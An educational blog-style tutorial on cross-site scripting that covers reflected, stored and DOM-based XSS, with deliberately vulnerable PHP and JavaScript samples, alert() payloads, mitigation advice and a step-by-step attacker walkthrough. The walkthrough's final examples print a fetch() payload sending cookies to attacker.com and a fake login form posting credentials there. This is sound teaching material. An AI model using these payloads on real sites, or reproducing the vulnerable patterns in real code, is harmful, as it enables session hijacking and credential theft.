## **Introduction**

Think of logging into your favorite site—such as your bank, your webmail, or an online shop—and you inadvertently hand over your login credentials to a hacker. This doesn't occur because the site is fraudulent, but because the legitimate site has been tricked into violating your trust. This is not a guess. It is known as Cross-Site Scripting (XSS)—one of the most harmful and prevalent issues users encounter on the internet.

Today we discuss how XSS attacks occur, why they are so dangerous, and what smart users, security researchers, and developers can do to prevent them. Since increasingly more JavaScript applications are executing on users' computers, it is increasingly important to understand how to defend against XSS.

## **Understanding XSS: What It Is and Why It Matters**

### What is XSS?

Cross-Site Scripting (XSS) occurs when a malicious actor injects client-side scripts (usually JavaScript) into web pages viewed by others. These scripts run in the browser of an unsuspecting user, stealing data or performing actions without consent.

### Why is it dangerous?

* Bypasses Same-Origin Policy
    
* Hijacks user sessions
    
* Steals credentials and sensitive info
    
* Delivers malware
    
* Defaces sites or redirects traffic

## **Types of XSS Attacks**

## Type I: Reflected XSS (Non-Persistent)

### What is Reflected XSS?

Reflected XSS happens when user input is immediately echoed by the server without proper sanitization or escaping. This type of XSS is often delivered via malicious links, form submissions, or URL parameters.

***Real Example in PHP***

```php
<?php
$search_term = $_GET['query'];
echo "<p>You searched for: ". $search_term. "</p>";
?>
```

***Attack URL***

```plaintext
http://example.com/search.php?query=<script>alert('XSS')</script>
```

When a victim clicks this link, the malicious script is executed in their browser.

### Why It Works

* The input `query` is directly embedded into HTML without validation or escaping.
    
* The browser interprets the `<script>` tag and executes the JavaScript.
    

### How to Prevent Reflected XSS

* **Escape Output**: Use `htmlspecialchars()` in PHP.
    
    ```php
    echo "<p>You searched for: ". htmlspecialchars($search_term, ENT_QUOTES, 'UTF-8'). "</p>";
    ```
    
* **Validate and Sanitize Input**: Use a whitelist approach to allow only expected characters.
    
* **Use HTTP Headers**: Set `Content-Security-Policy` to reduce script execution risks.

## Type II: Stored XSS (Persistent)

### What is Stored XSS?

Stored XSS occurs when user input is saved on the server (like in a database) and later rendered on web pages without proper escaping. This type is more dangerous because every visitor to the affected page is exposed to the payload.

***Real Example in PHP***

```php
// Store comment
if (isset($_POST['comment'])) {
    $comment = $_POST['comment'];
    // Stored without sanitization
    // Imagine this goes into a database
}

// Display comments
foreach ($comments as $c) {
    echo "<p>". $c['text']. "</p>";
}
```

***Attack Payload***

```html
<script>alert('Stored XSS!')</script>
```

This script will run every time the comment is displayed to a user.

### Why It Works

* The script is stored permanently and delivered to all users.
    
* No output escaping is done when rendering the comments.
    

### How to Prevent Stored XSS

* **Sanitize before storing**: Strip tags or escape input at the time of saving.
    
* **Escape before displaying**: Use `htmlspecialchars()` or templating engines with auto-escaping.
    
* **Use ORM/Framework Best Practices**: Most modern frameworks provide XSS-safe rendering.
    
* **Implement CSP**: A Content Security Policy helps mitigate impact if XSS occurs.

## Type 0: DOM-Based XSS (Client-Side)

### What is DOM-Based XSS?

DOM-Based XSS occurs entirely on the client side, with JavaScript dynamically injecting unsanitized user data into the DOM. No server interaction is necessary to execute the payload.

***Real Example in JavaScript***

```javascript
const search = document.location.hash.substring(1);
document.getElementById('output').innerHTML = 'You searched for: ' + search;
```

***Attack URL***

```plaintext
http://example.com/#<img src="#" onerror="alert('DOM XSS!')">
```

When the browser parses the hash and injects it into the DOM, the malicious script executes.

### Why It Works

* The `innerHTML` property directly parses and renders HTML and JavaScript.
    
* The user-controlled value from `location.hash` is not sanitized or validated.
    

### How to Prevent DOM-Based XSS

* **Avoid using** `innerHTML` with untrusted data. Use `textContent` or `createTextNode()` instead.
    
    ```javascript
    document.getElementById('output').textContent = 'You searched for: ' + search;
    ```
    
* Sanitize client-side inputs: Use libraries like [DOMPurify](https://github.com/cure53/DOMPurify).
    
* Audit JavaScript for untrusted assignments to the DOM.

## **The Real Cost: Impacts of XSS Attacks**

![The Real Cost: Impacts of XSS Attacks](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/wjsrfq7dtw38xjcl32ll.png align="left")

* **Session Hijacking**: Stealing cookies to impersonate users.
    
* **Malware Injection**: Forced downloads or script execution.
    
* **Website Defacement**: Altering content to embarrass or mislead.
    
* **Phishing Attacks**: Fake login prompts on legitimate pages.
    
* **Reputation Damage**: User trust and brand image suffer.
    
* **Legal Consequences**: GDPR and compliance violations.

## **How Hackers Exploit XSS – Step-by-Step (Educational Purposes Only)**

### 1\. Reflected XSS

Reflected XSS occurs when user input is immediately echoed back by the server in a page response without proper sanitization.

#### Step-by-Step:

* **Identify echo points:** Look for pages that reflect user input, such as search forms or URL parameters.
    
    Example URL:
    
    ```plaintext
    https://victim.com/search?q=hello
    ```
    
* **Craft a payload:** Inject a script that executes when reflected.
    
    ```html
    <script>alert('XSS')</script>
    ```
    
* **Send malicious link:**
    
    ```plaintext
    https://victim.com/search?q=<script>alert('XSS')</script>
    ```
    
* **Victim clicks:** When the victim visits the link, the payload runs in their browser.

### 2\. Stored XSS

Stored XSS (a.k.a. persistent XSS) occurs when malicious input is permanently stored on the server (e.g., in a comment or profile) and then served to other users.

#### Step-by-Step:

* **Inject the script:** Post a comment or update a profile with a payload.
    
    ```html
    <script>alert('Stored XSS')</script>
    ```
    
* **Server stores it:** The content is saved in the database.
    
* **Script is displayed to all viewers:** Every user who visits the infected page executes the script.
    

---

### 3\. DOM-Based XSS

DOM-Based XSS exploits vulnerabilities in JavaScript on the client-side, without needing server interaction.

#### Step-by-Step:

* **Identify vulnerable functions:** Look for usage of `innerHTML`, `document.write`, or similar DOM manipulators.
    
    ```js
    document.getElementById("result").innerHTML = location.hash.substring(1);
    ```
    
* **Insert payload in URL fragment:**
    
    ```plaintext
    https://victim.com/page#<script>alert('DOM XSS')</script>
    ```
    
* **Script executes in the client browser.**
    

---

### 4\. Advanced Exploits: Stealing Session Cookies

With XSS, attackers can exfiltrate session cookies to hijack user sessions.

#### Example:

```js
<script>
fetch("http://attacker.com/steal?c=" + document.cookie);
</script>
```

This payload sends the victim's cookies to the attacker's server.

**Important:** Modern browsers implement HttpOnly cookies to prevent this. However, legacy systems may still be vulnerable.

---

### 5\. Phishing via HTML Injection

Attackers can inject fake login forms to trick users into entering credentials.

#### Example:

```html
<form action="http://attacker.com/login">
  <input type="text" name="user" />
  <input type="password" name="pass" />
  <input type="submit" />
</form>
```

Victims may mistake this for a legitimate login form and unknowingly submit their credentials.
